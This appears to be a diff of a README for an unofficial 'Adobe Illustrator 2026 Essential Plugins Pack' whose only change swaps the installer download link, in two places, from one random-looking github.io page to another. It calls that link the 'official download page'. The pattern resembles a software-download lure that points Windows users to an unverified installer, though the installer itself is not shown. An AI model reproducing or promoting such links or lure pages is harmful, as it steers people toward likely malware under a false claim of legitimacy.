@@ -2,7 +2,7 @@
 
 Welcome to the Adobe Illustrator 2026 Essential Plugins Pack, your go-to resource for enhancing Adobe Illustrator with powerful tools and assets. This pack is tailored for Windows desktop users and includes a wide range of plugins, brushes, vectors, and presets to streamline your design process. With the 2026 edition, you get the latest features and compatibility updates, ensuring a smooth and productive experience for designers of all levels.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -71,6 +71,6 @@ A: We periodically release updates to add new features, fix bugs, and improve co
 
 To access the latest version of the Adobe Illustrator 2026 Essential Plugins Pack, visit our official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This README was last updated in 2026. Enjoy enhancing your Adobe Illustrator experience!
